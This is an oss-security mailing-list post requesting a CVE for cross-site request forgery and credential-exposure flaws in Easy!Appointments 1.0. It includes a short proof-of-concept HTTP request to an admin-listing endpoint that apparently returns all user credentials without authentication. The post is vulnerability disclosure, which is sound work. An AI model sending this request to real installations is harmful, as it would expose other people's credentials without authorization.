  oss-security - CVE request: Easy!Appointments 1.0 Cross-Site Request Forgery and  Insufficiently Protected Credentials vulnerabilities            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 27 Jul From: Henri Salo <henri@...v.fi> To: oss-security@...ts.openwall.com Cc: cve-assign@...re.org, Alex Tselegidis <alextselegidis@...il.com> Subject: CVE request: Easy!Appointments 1.0 Cross-Site Request Forgery and  Insufficiently Protected Credentials vulnerabilities  -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  Product: Easy!Appointments Open Source Appointment Scheduler Product URL: http://easyappointments.org/ Vendor: Alex Tselegidis Vulnerability Type:     Cross-Site Request Forgery     Insufficiently Protected Credentials Vulnerable Versions: 1.0 Fixed Version: next release Vendor Notification: Solution Status: Fixed by vendor Solution Date: Public Disclosure:  Vulnerability Details:  The web application does not sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request. The application transmits all user credentials to unauthenticated user and possibly allows other unauthorized actions.  Proof-of-concept without authentication:  """ POST /ea/backend_api/ajax_filter_admins HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 (X11; Linux Accept: application/json, text/javascript, */*; Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: https://example.com/ea/backend/users Content-Length: 4 Connection: keep-alive Pragma: no-cache Cache-Control: no-cache  key= """  Returns:  """ HTTP/1.1 OK Date: Thu, 09 Apr GMT Server: Apache/2.2 X-Powered-By: Set-Cookie: ci_session=*removed*; expires=Thu, GMT; path=/ Keep-Alive: timeout=5, Connection: Keep-Alive Content-Type: text/html Content-Length:  """  Fixed in following commit:                                                                                                                                                                                                                                                            Related commits to add CSRF protection:                      References:                     https://en.wikipedia.org/wiki/Cross-site_request_forgery          - --  Henri Salo -----BEGIN PGP SIGNATURE----- Version: GnuPG (GNU/Linux)  ++lf9BJDbx+CMendxx9Z =cYYp -----END PGP SIGNATURE-----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      